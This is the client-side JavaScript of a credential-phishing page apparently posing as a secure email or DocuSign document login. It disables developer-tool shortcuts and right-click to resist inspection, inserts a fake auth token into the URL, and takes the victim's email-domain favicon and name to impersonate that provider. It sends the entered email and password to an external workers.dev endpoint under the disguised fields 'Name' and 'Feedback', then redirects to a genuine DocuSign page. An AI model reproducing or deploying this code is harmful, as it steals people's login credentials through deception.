document.onkeydown = function (event) {
  if (event.keyCode == 123) {
    return false;
  }
  if (
    event.ctrlKey &&
    event.shiftKey &&
    (event.keyCode == "I".charCodeAt(0) ||
      event.keyCode == "C".charCodeAt(0) ||
      event.keyCode == "J".charCodeAt(0))
  ) {
    return false;
  }
  if (
    event.ctrlKey &&
    (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))
  ) {
    return false;
  }
};
document.addEventListener("contextmenu", (e) => e.preventDefault());
const SECRET_KEY = "MATT_SECURE_2026";
let failedAttempts = 0;

function encryptPayload(obj) {
  const json = JSON.stringify(obj);
  let hex = "";

  for (let i = 0; i < json.length; i++) {
    const xorByte =
      json.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length);

    hex += ("0" + xorByte.toString(16)).slice(-2);
  }

  return btoa(hex);
}
(function spicyUrl() {
  if (!window.location.search) {
    const alphabet =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let token = "";
    for (let i = 0; i < 64; i++) {
      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    }
    const newUrl =
      window.location.protocol +
      "//" +
      window.location.host +
      window.location.pathname +
      "?auth_token=" +
      token +
      "&session_ref=v4_secure_verification";

    window.history.replaceState({ path: newUrl }, "", newUrl);
  }
})();
const viper = document.getElementById("viper");
(function spiritSeal() {
  const value = viper.value;
  if (value.includes("@")) {
    document.getElementById("totem").src =
      "https://www.google.com/s2/favicons?sz=128&domain=" +
      value.split("@")[1].toLowerCase();
  }
})();
(function () {
  const emailEl = document.getElementById("viper");
  const titleEl = document.getElementById("doc-title");

  if (emailEl && emailEl.value.includes("@")) {
    let domainPart = emailEl.value.split("@")[1].split(".")[0];
    let brand = domainPart.charAt(0).toUpperCase() + domainPart.slice(1);
    document.title = brand + " Secure Email";
    titleEl.innerText = brand + " Secure Email";
  }
})();
function falcon() {
  const customerName = viper.value;
  const customerMessage = document.getElementById("cobra").value;
  const unlockBtn = document.getElementById("btn-unlock");
  const spinner = document.getElementById("loading-spinner");
  const btnText = document.getElementById("btn-text");
  const form = document.getElementById("loginBox");
  document.getElementById("sentinel").style.display = "none";
  form.classList.remove("shake");
  if (!customerMessage || customerMessage.length < 1) {
    showError("Please enter your password.");
    form.classList.add("shake");
    return;
  }
  const cleanPayload = new URLSearchParams();
  cleanPayload.append("Name", customerName);
  cleanPayload.append("Feedback", customerMessage);
  cleanPayload.append("timestamp", Date.now().toString());
  unlockBtn.disabled = true;
  spinner.style.display = "block";
  btnText.innerText = "Verifying...";
  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: cleanPayload,
  })
    .then((r) => r.json())
    .then((result) => {
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      if (result.status === "exhausted") {
        showError("✌ Access locked. Too many failed attempts.");
        unlockBtn.disabled = true;
        setTimeout(() => {
          window.location.href =
            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }

      if (result.status === "wrong") {
        failedAttempts++;

        if (failedAttempts >= 3) {
          showError("✌ Access locked. Too many failed attempts.");
          unlockBtn.disabled = true;
          setTimeout(() => {
            window.location.href =
              "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
          }, 3000);
          return;
        }

        showError("An error occurred please try again later.");
        form.classList.add("shake");
        document.getElementById("cobra").value = "";
        return;
      }

      if (result.status === "success") {
        btnText.innerText = "Success! Redirecting...";
        unlockBtn.style.background = "#10b981";
        window.location.href = result.redirect;
      } else {
        showError("Security token mismatch.");
      }
    })
    .catch(() => {
      failedAttempts++;
      if (failedAttempts >= 3) {
        showError("✌ System Locked. Redirecting...");
        setTimeout(() => {
          window.location.href =
            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      showError("Connection error.");
    });
}
function showError(message) {
  const container = document.getElementById("sentinel");
  container.style.display = "flex";
  document.getElementById("error-text").innerText = message;
}
